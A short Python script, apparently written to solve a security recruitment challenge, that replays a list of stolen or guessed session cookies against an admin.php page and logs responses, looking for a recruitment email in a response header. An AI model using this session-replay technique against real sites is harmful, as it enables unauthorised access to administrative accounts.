import requests
import re

aurl = 'http://task.zostansecurity.ninja/admin.php'
cookies = 'cookies.txt'

with open(cookies) as file:
    lines = file.readlines()
# r = r'\d+\t+.*'
# reg= r'\d+[a-zA-Z\d]*'
output = 'LOGS\n'
lc = []
log1 = ''
log2 = ''
adresy = ''
for l in lines:
    s = l.split('\t')
    log1 += str(s) + '\n'
    if len(s) >= 2:
        n = s[0]
        v = s[1]
        n = n.replace(' ', '')
        v = v.replace(' ', '')
        v = v.replace('\t', '')
        v = v.replace('\n', '')
        lc.append([n,v])
        log2 += f'l:{len(v)}n:{n}\tvalue:{v}\n'
output += log1 + '\n'
output += log2
log3 = '\nHEADERS\n'
for c in lc:
    print(c)
    # cookie = {'cookie': c[1]}
    # cookie = {'cookies': c[1]}
    # cookie = {c[0]: c[1]}
    # cookie = {'x-adres-rekrutacja': c[1]}
    cookie = {'sess': c[1]}
    r = requests.get(url=aurl, cookies=cookie)
    log3 += str(r.status_code) + '\t'
    log3 += str(r.headers) + '\n'
    log3 += str(r.text)
    adres = str(r.headers.get('x-adres-rekrutacja'))
    if '@' in adres:
        print(f'ZNALEZIONO ADRES EMAIL: {adres}')
        adresy += f'\n{adres}'

output += log3
output += adresy
with open('output-ninja.txt', 'w') as f:
    f.write(output)



